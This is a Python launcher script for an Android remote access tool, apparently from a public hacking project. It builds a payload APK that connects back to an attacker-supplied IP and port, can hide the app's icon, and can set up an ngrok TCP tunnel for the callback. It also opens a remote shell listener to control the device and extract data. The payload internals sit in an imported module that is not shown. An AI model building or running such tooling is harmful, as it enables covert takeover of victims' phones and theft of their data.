#!/usr/bin/python
# -*- coding: utf-8 -*-

from utils import *
import argparse
import sys
import platform
try:
    from pyngrok import ngrok,conf
except ImportError as e:
    print(stdOutput("error")+"\033[1mpyngrok not found");
    print(stdOutput("info")+"\033[1mRun pip3 install -r requirements.txt")
    exit()
    
clearDirec()
# Print Logo
# ANSI Colors
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
RESET = "\033[0m"
BOLD = "\033[1m"

print(f"""                
          
                    {CYAN}_                       __          __{RESET}
    {RED}/\\{RESET}             {CYAN}| |                      \\ \\        / /{RESET}
   {RED}/  \\{RESET}   {CYAN}_ __   __| |_ __ ___         __   _\\ \\  /\\  / /{RESET} 
  {RED}/ /\\ \\{RESET} {CYAN}| '_ \\ / _` | '__/ _ \\        \\ \\ / /\\ \\/  \\/ /{RESET}  
 {RED}/ ____ \\{RESET}{CYAN}| | | | (_| | | | (_) |{RED}-HAKING-{CYAN}\\ V /  \\  /\\  /{RESET}   
{RED}/_/    \\_\\{RESET}{CYAN}_| |_|\\__,_|_|  \\___/{RESET}          {CYAN}\\_/{RESET}    {CYAN}\\/  \\/{RESET}    
                                          {GREEN}{BOLD}- By AryanVBW{RESET}
                                          {YELLOW}{BOLD}v1.0.0{RESET}
{MAGENTA}╔════════════════════════════════════════════════════════╗{RESET}
{MAGENTA}║{RESET} {BOLD}• Android Remote Access Tool{RESET}                        {MAGENTA}║{RESET}
{MAGENTA}║{RESET} {BOLD}• Create payload, control device, extract data{RESET}      {MAGENTA}║{RESET}
{MAGENTA}╚════════════════════════════════════════════════════════╝{RESET}
""") 

parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build',help='For Building the apk',action='store_true')
parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
parser.add_argument('--ngrok',help='For using ngrok',action='store_true')
parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
args = parser.parse_args()


# Function to get valid IP address from user
def get_ip_input():
    while True:
        ip = input(f"{GREEN}{BOLD}Enter IP address: {RESET}")
        if is_valid_ip(ip):
            return ip
        else:
            print(stdOutput("error")+f"{BOLD}Invalid IP address format. Please try again.{RESET}")

# Function to get valid port from user
def get_port_input():
    while True:
        port = input(f"{GREEN}{BOLD}Enter port number: {RESET}")
        if port.isdigit() and 1 <= int(port) <= 65535:
            return port
        else:
            print(stdOutput("error")+f"{BOLD}Invalid port number. Please enter a value between 1-65535.{RESET}")


if float(platform.python_version()[:3]) < 3.6 and float(platform.python_version()[:3]) > 3.8 :
    print(stdOutput("error")+"\033[1mPython version should be between 3.6 to 3.8")
    sys.exit()

if args.build:
    port_ = args.port
    icon=True if args.icon else None
    if args.ngrok:
        conf.get_default().monitor_thread = False
        port = 8000 if not port_ else port_
        tcp_tunnel = ngrok.connect(port, "tcp")
        ngrok_process = ngrok.get_ngrok_process()
        domain,port = tcp_tunnel.public_url[6:].split(":")
        ip = socket.gethostbyname(domain)
        print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s"%(ip,port))
        build(ip,port,args.output,True,port_,icon)
    else:
        ip_addr = args.ip
        port_num = args.port
        
        if not ip_addr:
            print(stdOutput("info")+f"{BOLD}IP address not provided in arguments.{RESET}")
            ip_addr = get_ip_input()
        
        if not port_num:
            print(stdOutput("info")+f"{BOLD}Port not provided in arguments.{RESET}")
            port_num = get_port_input()
            
        build(ip_addr, port_num, args.output, False, None, icon)

if args.shell:
    ip_addr = args.ip
    port_num = args.port
    
    if not ip_addr:
        print(stdOutput("info")+f"{BOLD}IP address not provided in arguments.{RESET}")
        ip_addr = get_ip_input()
    
    if not port_num:
        print(stdOutput("info")+f"{BOLD}Port not provided in arguments.{RESET}")
        port_num = get_port_input()
        
    get_shell(ip_addr, port_num)
